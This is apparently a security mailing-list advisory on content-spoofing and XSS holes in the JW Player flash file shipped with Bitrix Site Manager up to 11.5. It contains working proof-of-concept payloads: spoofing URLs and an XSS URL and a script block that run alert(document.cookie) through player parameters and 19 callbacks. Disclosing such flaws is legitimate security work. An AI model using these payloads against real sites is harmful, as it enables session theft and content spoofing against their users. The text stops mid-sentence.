Hello list!

I want to warn you about security vulnerabilities in Bitrix Site Manager. It 
is commercial CMS.

These are Content Spoofing and Cross-Site Scripting vulnerabilities. These 
holes bypass built-in WAF and all other protections of Bitrix.

-------------------------
Affected products:
-------------------------

Vulnerable are Bitrix Site Manager 11.5 and previous versions. Which consist 
JW Player Pro.

Versions of Bitrix 11.5 after 2012.08.24 must be not affected, because the 
developers fixed these holes after my informing. As I've checked (at main 
sites of developers, where I found these vulnerabilities), they were fixed 
by removing this flash file.

Vulnerabilities are similar to the ones in JW Player 
(http://securityvulns.ru/docs28176.html) and JW Player Pro 
(http://securityvulns.ru/docs28483.html).

For finding these holes, which bypass WAF and all other their protections, 
1C-Bitrix had no need to waste their time and money on conducting 
competition on hacking conference CC9 
(http://www.1c-bitrix.ru/about/life/news/171346/) for bypassing their 
Proactive Protection (WAF) and other protections of CMS, or working with one 
security company, all of which were unable to find these holes in Bitrix for 
many years, but they just should contact me. Or just read my public advisory 
in June concerning vulnerabilities in JW Player.

Content Spoofing (WASC-12):

In parameter file there can be set as video, as audio files.

Swf-file of JW Player accepts arbitrary addresses in parameters file and 
image, which allows to spoof content of flash - i.e. by setting addresses of 
video (audio) and/or image files from other site.

http://site/bitrix/components/bitrix/player/mediaplayer/player.swf?file=1.flv&image=1.jpg

Swf-file of JW Player accepts arbitrary addresses in parameter config, which 
allows to spoof content of flash - i.e. by setting address of config file 
from other site (parameters file and image in xml-file accept arbitrary 
addresses). For loading of config file from other site it needs to have 
crossdomain.xml.

http://site/bitrix/components/bitrix/player/mediaplayer/player.swf?config=1.xml

1.xml

<config>
  <file>1.flv</file>
  <image>1.jpg</image>
</config>

Swf-file of JW Player accepts arbitrary addresses in parameter playlistfile, 
which allows to spoof content of flash - i.e. by setting address of playlist 
file from other site (parameters media:content and media:thumbnail in 
xml-file accept arbitrary addresses). For loading of playlist file from 
other site it needs to have crossdomain.xml.

    <title>Example playlist</title>

      <title>Video #1</title>
      <description>First video.</description>

XSS (WASC-08):

http://site/bitrix/components/bitrix/player/mediaplayer/player.swf?playerready=alert(document.cookie)

XSS (WASC-08):

If at the site at page with jwplayer.swf (player.swf) there is possibility 
(via HTML Injection) to include JS code with callback-function, and there 
are 19 such functions in total, then it's possible to conduct XSS attack. 
I.e. JS-callbacks can be used for XSS attack.

Example of exploit:

<script type="text/javascript" src="jwplayer.js"></script>
<div id="container">...</div>
<script type="text/javascript">
jwplayer("container").setup({
flashplayer: "jwplayer.swf",
file: "1.flv",
autostart: true,
height: 300,
width: 480,
events: {
onReady: function() { alert(document.cookie); },
onComplete: function() { alert(document.cookie); },
onBufferChange: function() { alert(document.cookie); },
onBufferFull: function() { alert(document.cookie); },
onError: function() { alert(document.cookie); },
onFullscreen: function() { alert(document.cookie); },
onMeta: function() { alert(document.cookie); },
onMute: function() { alert(document.cookie); },
onPlaylist: function() { alert(document.cookie); },
onPlaylistItem: function() { alert(document.cookie); },
onResize: function() { alert(document.cookie); },
onBeforePlay: function() { alert(document.cookie); },
onPlay: function() { alert(document.cookie); },
onPause: function() { alert(document.cookie); },
onBuffer: function() { alert(document.cookie); },
onSeek: function() { alert(document.cookie); },
onIdle: function() { alert(document.cookie); },
onTime: function() { alert(document.cookie); },
onVolume: function() { alert(document.cookie); }
}
});
</script>

There is such feature as logo in licensed version of the player. So in 
licensed versions of swf-file there are also the next vulnerabilities:
